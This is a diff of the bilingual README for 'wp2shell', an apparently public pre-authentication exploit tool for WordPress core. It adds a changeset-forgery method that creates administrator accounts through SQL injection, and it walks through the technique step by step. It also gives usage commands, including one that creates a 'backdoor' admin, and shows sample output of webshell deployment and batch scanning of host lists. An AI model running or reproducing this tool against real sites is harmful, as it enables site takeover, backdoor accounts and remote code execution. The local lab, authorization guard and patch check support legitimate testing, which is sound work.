@@ -8,16 +8,16 @@
 - **仅 SQLi 接收器**（需 facilitating 插件/主题）：6.8.0–6.8.5
 - **已修复**：6.8.6 / 6.9.5 / 7.0.2
 
-本工具 Fork 自 [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell)（原始 PoC，作者 Thomas Jordan / st4ndard），在原始 PoC 基础上进行了大量增强：
+本工具 Fork 自 [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell)（原始 PoC，作者 Thomas Jordan / st4ndard），融合了以下社区技术进行了大量增强：
 
+- **Changeset 伪造管理员创建**（默认）：通过 UNION SELECT 伪造 Customizer changeset 对象，利用 WordPress 对象缓存 + changeset 提权机制，**不依赖 stacked queries 或 FILE 权限**即可直接创建管理员账户（技术来源：vulhub / sergiointel）
 - **内容型布尔盲注**（默认）：基于 HTTP 响应主体帖子数量做确定性 True/False 判定，无需 SLEEP 延迟，本地 10 秒内完成 34 字符 hash 提取
 - **版本自动检测**：REST API → HTML meta → Feed 三级指纹，自动区分 full_chain / sqli_only / patched
 - **批量扫描**：`-f hosts.txt` + `-t 10` 多线程并发
 - **取证证据**：`--proof` 提取 `@@version` + `current_user()`
 - **远程安全守卫**：`--authorized` 强制远程授权确认
 - **重定向安全**：301/302 保持 POST body，cdn/waf 环境下更可靠
-- **UNION SELECT INTO OUTFILE**：快速文件写入路径（需 MySQL FILE 权限）
-- **多路径降级兜底**：UNION OUTFILE → stacked INSERT → legacy OUTFILE → 布尔盲注
+- **多路径降级兜底**：Changeset 管理员创建 → UNION OUTFILE → stacked INSERT → legacy OUTFILE → 布尔盲注提取 hash
 - **SLEEP 时序盲注保留**：`--time-based` 作为降级选项
 - **Docker 测试环境**：`${WP_TAG}` 参数化，一键切换漏洞/修复版本
 
@@ -38,7 +38,7 @@ Pre-authentication RCE exploit for WordPress Core REST API (CVE-2026-63030 + CVE
 
 ## Overview
 
-HTTP/HTTPS wp2shell PoC with advanced capabilities for impact demonstration on improperly configured WordPress sites. Forked from [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell) (original PoC by Thomas Jordan / st4ndard), significantly enhanced with techniques from [0xsha/wp2shell](https://github.com/0xsha/wp2shell) and [dinosn/wp2shell-lab](https://github.com/dinosn/wp2shell-lab).
+HTTP/HTTPS wp2shell PoC with advanced capabilities for impact demonstration on improperly configured WordPress sites. Forked from [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell) (original PoC by Thomas Jordan / st4ndard), significantly enhanced with techniques from [vulhub/vulhub](https://github.com/vulhub/vulhub), [0xsha/wp2shell](https://github.com/0xsha/wp2shell), and [dinosn/wp2shell-lab](https://github.com/dinosn/wp2shell-lab).
 
 **Affected versions:**
 
@@ -57,6 +57,18 @@ Discovered by Adam Kues (Assetnote / Searchlight Cyber); SQLi also credited to T
 4. Optional CloudFront WAF bypass using `GET + _method=POST` with PHP array params
 
 ## Key Enhancements
+
+### Changeset-Forging Admin Creation (Default)
+
+Creates a new administrator account **without stacked queries or FILE privilege** — the only admin-creation technique that works on default WordPress configurations. Leverages WordPress's Customizer changeset workflow:
+
+1. Seeds 3 real `oembed_cache` posts via UNION SELECT + `[embed]` shortcode
+2. Blind-extracts cache post IDs, table prefix, and existing admin user ID
+3. UNION SELECT returns 7 forged `wp_posts` rows reusing the cache post IDs, including a forged `customize_changeset` whose `nav_menu_item` settings carry the existing admin's `user_id`
+4. WordPress caches forged rows as `WP_Post` objects; changeset publish calls `wp_set_current_user(admin_id)`, temporarily elevating privileges
+5. `POST /wp/v2/users` sub-requests in the same batch bypass `current_user_can('create_users')` — new admin created
+
+Credit: [vulhub](https://github.com/vulhub/vulhub) / sergiointel.
 
 ### Content-Based Boolean Oracle (Default)
 
@@ -80,10 +92,11 @@ Three-tier fingerprinting (REST API → HTML meta → Feed), classifies targets 
 ### Multi-Path RCE Fallback Chain
 
 ```
-Phase 3a: UNION SELECT INTO OUTFILE  (fastest — needs MySQL FILE privilege)
-Phase 3b: stacked INSERT admin       (fast — needs multi_query, rare)
-Phase 3c: legacy subquery OUTFILE    (needs FILE priv + secure_file_priv)
-Phase 3d: blind extraction → crack   (slow but works everywhere)
+Phase 3a: UNION SELECT INTO OUTFILE           (fastest — needs MySQL FILE privilege)
+Phase 3b: Changeset-forging admin creation    (default — works everywhere, ~2 min)
+  └─ fallback: stacked INSERT admin          (needs multi_query, rare)
+Phase 3c: legacy subquery OUTFILE             (needs FILE priv + secure_file_priv)
+Phase 3d: blind extraction → hash crack       (slow but universal fallback)
 ```
 
 ### Batch Scanning
@@ -116,6 +129,7 @@ python wp2shell.py -f hosts.txt --check [options]    # batch scan
 |------|-------------|
 | `--check` | Non-destructive vulnerability probe only |
 | `--exploit` | Full pre-auth RCE chain |
+| `--create-admin-only` | Create admin via changeset forgery and exit (no RCE) |
 | `--shell` | Deploy shell with known admin creds |
 | `--cleanup` | Remove deployed webshell |
 | `--extract SQL` | Extract data via blind SQLi |
@@ -129,11 +143,11 @@ python wp2shell.py -f hosts.txt --check [options]    # batch scan
 | `--table-prefix PREFIX` | WordPress table prefix | `wp_` |
 | `--webroot PATH` | Server webroot for OUTFILE | `/var/www/html` |
 | `--shell-key KEY` | Webshell auth key | Random |
-| `--admin-user USER` | Admin username (for `--exploit`/`--shell`/`--cleanup`) | Random |
-| `--admin-pass PASS` | Admin password (for `--exploit`/`--shell`/`--cleanup`) | Random |
+| `--admin-user USER` | Admin username (for `--exploit`/`--create-admin-only`/`--shell`/`--cleanup`) | Random |
+| `--admin-pass PASS` | Admin password (for `--exploit`/`--create-admin-only`/`--shell`/`--cleanup`) | Random |
 | `--skip-outfile` | Skip SELECT INTO OUTFILE attempt | Off |
 | `--no-union-outfile` | Skip UNION SELECT INTO OUTFILE attempt | Off |
-| `--no-create-admin` | Skip stacked INSERT admin creation | Off |
+| `--no-create-admin` | Skip admin creation (changeset + stacked INSERT) | Off |
 | `--sleep DURATION` | SLEEP duration for blind SQLi | `0.15` |
 | `--time-based` | Use SLEEP-based timing oracle (fallback) | Off |
 | `--skip-version-check` | Skip version detection (use when fingerprint fails) | Off |
@@ -150,11 +164,21 @@ python wp2shell.py -f hosts.txt --check [options]    # batch scan
 # Check if target is vulnerable (non-destructive)
 python wp2shell.py https://target.com --check
 
-# Full exploit chain (content-based oracle, ~10s local)
+# Full exploit chain (changeset admin creation → webshell → RCE)
 python wp2shell.py https://target.com --exploit -v
+
+# Create admin account only, no RCE (verify with blind SQLi)
+python wp2shell.py https://target.com --create-admin-only
+
+# Create admin with custom credentials
+python wp2shell.py https://target.com --create-admin-only \
+    --admin-user backdoor --admin-pass 'Str0ng!P@ss'
 
 # Full exploit with SLEEP timing fallback (slower, no posts needed)
 python wp2shell.py https://target.com --exploit --time-based --sleep 3
+
+# Skip admin creation, go straight to hash extraction
+python wp2shell.py https://target.com --exploit --no-create-admin
 
 # Extract arbitrary data via blind SQLi
 python wp2shell.py https://target.com --extract "SELECT user_login FROM wp_users LIMIT 1"
@@ -240,7 +264,38 @@ $ python3 wp2shell.py http://127.0.0.1:8889 --check
   [+] VULNERABLE - desync confirmed: categories received block-renderer handler
 ```
 
-### 2. Forensic Evidence Extraction
+### 2. Changeset Admin Creation (No RCE)
+
+```bash
+$ python3 wp2shell.py http://127.0.0.1:8889 --create-admin-only
+  [+] Content oracle verified: 1=1→True, 1=0→False
+  [*] Seeding 3 oEmbed cache posts...
+  [*] Extracting table prefix and admin user ID...
+  [+] Posts table: wp_posts, admin ID: 1
+  [*] Recovering oEmbed cache post IDs...
+  [+] Cache post IDs: [5, 6, 7]
+  [*] Publishing forged changeset → creating administrator...
+  [+] Administrator 'w2s_xxxxxx' created and verified!
+  [+] === ADMIN CREATED ===
+  [+] Username: w2s_xxxxxx
+  [+] Password: <random>
+  [+] Email:    w2s_xxxxxx@wp2shell.local
+```
+
+### 3. Full RCE Chain (Changeset Admin + Webshell)
+
+Changeset creates admin (~2 min) → automatic login → plugin upload → webshell:
+
+```bash
+$ python3 wp2shell.py http://127.0.0.1:8889 --exploit -v
+  [+] WordPress version: 6.9.4 — VULNERABLE (full RCE chain)
+  [+] Content oracle verified
+  [+] Administrator 'wp_support_xxxxxx' created and verified!
+  [+] Plugin uploaded
+  [+] Webshell verified at http://127.0.0.1:8889/.../wp-health-monitor.php
+```
+
+### 4. Forensic Evidence Extraction
 
 Read `@@version` and `current_user()` from the database as read-only proof that the SQL injection channel is active:
 
@@ -250,22 +305,7 @@ $ python3 wp2shell.py http://127.0.0.1:8889 --extract "dummy" --proof
   [+] current_user(): wpuser@%
 ```
 
-### 3. Full Exploit Chain (Content-Based Oracle, ~10s Local)
-
-```bash
-$ python3 wp2shell.py http://127.0.0.1:8889 --exploit -v
-  [+] WordPress version: 6.9.4 — VULNERABLE (full RCE chain)
-  [+] VULNERABLE - desync confirmed
-  [+] Content oracle verified: 1=1→True, 1=0→False
-  [+] SQL injection CONFIRMED via nested batch
-  [*] Phase 3a: UNION SELECT INTO OUTFILE
-  [!] UNION OUTFILE failed (split-query or no FILE priv)
-  [*] Phase 3d: Extracting admin credentials via blind SQLi...
-  [+] admin_login: admin
-  [+] admin_hash: $wp$2y$10$e5Ulmqy.i73t8Kb5IDCsOOS8
-```
-
-### 4. Deploy Webshell (Known Credentials)
+### 5. Deploy Webshell (Known Credentials)
 
 ```bash
 $ python3 wp2shell.py http://127.0.0.1:8889 --shell \
@@ -275,7 +315,7 @@ $ python3 wp2shell.py http://127.0.0.1:8889 --shell \
   [+] Webshell verified at http://127.0.0.1:8889/wp-content/plugins/.../wp-health-monitor.php
 ```
 
-### 5. Batch Scan
+### 6. Batch Scan
 
 ```bash
 $ echo "http://127.0.0.1:8889" > targets.txt
@@ -284,7 +324,7 @@ $ python3 wp2shell.py -f targets.txt --check
   summary: 1 scanned | vulnerable=1  affected=0  not_vuln=0  error=0
 ```
 
-### 6. Remote Target Authorization Guard
+### 7. Remote Target Authorization Guard
 
 ```bash
 $ python3 wp2shell.py https://example.com --check
@@ -292,7 +332,7 @@ $ python3 wp2shell.py https://example.com --check
   [!] Only test assets you own or are explicitly authorized.
 ```
 
-### 7. Validate the Fix (Patched Version)
+### 8. Validate the Fix (Patched Version)
 
 ```bash
 $ make patched
@@ -301,9 +341,19 @@ $ python3 wp2shell.py http://127.0.0.1:8889 --check
   [-] WordPress version: 7.0.2 — patched or out of range
 ```
 
+## Technique Comparison: Admin Creation
+
+| Method | Technique | Requirements | Speed | Default? |
+|--------|-----------|-------------|:---:|:---:|
+| **Changeset forgery** | UNION SELECT → forged changeset → `wp_set_current_user()` → `POST /wp/v2/users` | ≥1 published post | ~2 min | ✅ |
+| Hash extraction + crack | Blind SQLi → bcrypt hash → hashcat → login | Crackable password | hours | Fallback |
+| Stacked INSERT | `SELECT 1;INSERT INTO wp_users...` | `mysqli_multi_query` enabled | seconds | Fallback |
+| UNION INTO OUTFILE | `UNION SELECT ... INTO OUTFILE` | MySQL `FILE` privilege | seconds | Fallback |
+
 ## Credits
 
 - Original PoC: [ThomasNJordan/wp2shell](https://github.com/ThomasNJordan/wp2shell) (Thomas Jordan / st4ndard)
+- Changeset-forging admin creation: [vulhub/vulhub](https://github.com/vulhub/vulhub) / sergiointel
 - Unified PoC techniques: [0xsha/wp2shell](https://github.com/0xsha/wp2shell)
 - Detector design & lab patterns: [dinosn/wp2shell-lab](https://github.com/dinosn/wp2shell-lab)
 - Vulnerability discovery: Adam Kues (Assetnote / Searchlight Cyber)
